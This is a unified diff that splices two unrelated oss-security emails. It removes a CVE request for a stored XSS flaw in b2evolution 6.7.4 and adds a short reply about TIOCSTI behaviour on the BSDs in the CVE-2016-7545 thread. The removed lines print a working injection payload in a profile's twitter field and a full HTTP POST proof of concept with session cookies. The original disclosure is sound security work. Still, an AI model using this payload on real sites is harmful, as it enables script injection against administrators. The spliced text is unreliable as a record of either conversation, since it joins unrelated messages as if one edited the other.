@@ -1,59 +1,23 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/08/12/4
-Message-ID: <6D072F0A5597B449BEE8A9770E0BDBEA018D293C@EX01.corp.qihoo.net>
-Date: Fri, 12 Aug 2016 07:18:53 +0000
-From: 陈瑞琦 <chenruiqi@....cn>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: CVE request: XSS vuln in b2evolution v6.7.4
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/29/9
+Message-Id: <20160929122747.1155317FDAB@rebar.astron.com>
+Date: Thu, 29 Sep 2016 08:27:47 -0400
+From: christos@...las.com (Christos Zoulas)
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE-2016-7545 -- SELinux sandbox escape
 Content-Type: text/plain; charset=utf-8
 
-I found a XSS vuln in b2evolution v6.7.4
+On Sep 29, 12:32pm, jwilk@...lk.net (Jakub Wilk) wrote:
+-- Subject: Re: [oss-security] CVE-2016-7545 -- SELinux sandbox escape
 
-Title: Stored XSS in b2evolution version 6.7.4
-Author: Chen Ruiqi, Chenruiqi@....cn, @Codesafe Team
-Date: 2016-08-09
-Download Site: http://b2evolution.net/downloads/
-Vendor: b2evolution.net
-Vendor Notified: 2016-08-09
-Vendor Contact: http://b2evolution.net/?disp=msgform
---------------------------------------------------------------------------------------------------------
-Discription:
-b2evolution is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
-b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a "one click install" web app.[3](Wiki)
------------------------------------------------------------------------------------------------------------
-Vulnerability:
-There is stored XSS in b2evolution version 6.7.4
-Any user can edit his or her twitter infomation at 'User Profile' with some evil code.
-And when the admin see the user profile at back-office, the page is lack of filter to protect the admin.
+| * Christos Zoulas <christos@...las.com>, 2016-09-26, 13:53:
+| >On the BSDs TIOCSTI has been limited to the superuser since the 4.4BSD Lite 2 
+| >release in 1995 (IIRC).
+| 
+| Hmm. I've just tried OpenBSD 5.7 and FreeBSD 10.3, and TIOCSTI works fine for 
+| non-root users.
 
-Step 1 : Register a user of the web-site
-Step 2 : Edit the twitter at http://192.168.204.128/b2evolution/index.php?disp=profile with something like https://twitter.com/kevino"onmouseover="alert(1)"onerror=1
-Step 3 : Save the changes
-Step 4 : The admin view the profile in back-office at http://192.168.204.128/b2evolution/admin.php?ctrl=users , when the mouse over the content, the XSS code runs.
+I am wrong, sorry. It still works on BSD for the owner of the tty controlling
+process group. I guess it is time to fix it everywhere.
 
---------------------------------------------------------------------------------------------------------
-PoC Code:
-POST /b2evolution/htsrv/profile_update.php HTTP/1.1
-Host: 192.168.204.128
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Referer: http://192.168.204.128/b2evolution/index.php?disp=profile
-Cookie: session_b2evo_192_168_204_128=49_I0EnVHgDXBKjsJd0e8fEhK6Ga82xEGDt; __smToken=AhuNTZNC8BaMfAVQV7ZpTW5a; evo_style=Variation
-Connection: close
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 653
-
-edited_user_login=kevino&edited_user_firstname=kevino&edited_user_lastname=kevino&edited_user_nickname=kevino&edited_user_gender=M&edited_user_ctry_ID=&edited_user_rgn_ID=&edited_user_subrg_ID=&edited_user_city_ID=&edited_user_age_min=&edited_user_age_max=&organizations%5B%5D=&uf_38=kevino&uf_39=kevino&uf_40=kevino&uf_41=https%3A%2F%2Ftwitter.com%2Fkevino%22onmouseover%3D%22alert%281%29%22onerror%3D%221&uf_42=https%3A%2F%2Ffacebook.com%2Fkevino&uf_43=http%3A%2F%2Fkevino.net%2Fkevino&new_field_type=3&actionArray%5Bupdate%5D=Save+Changes%21&crumb_user=CQ7LjBDKmMin8zqBDl050nNEbmINmIGi&user_tab=profile&identity_form=1&user_ID=8&blog=1&orig_user_ID=8
-----------------------------------------------------------------------------------------------------------
-Fix Code:
-Update to the version 6.7.5
-https://github.com/b2evolution/b2evolution/commit/83c40129f471b659755491a02b2ad981995d37c1
-
-Could you assign CVE id for this?
-
-Thank you
-
-Chen Ruiqi
-Codesafe Team
+christos
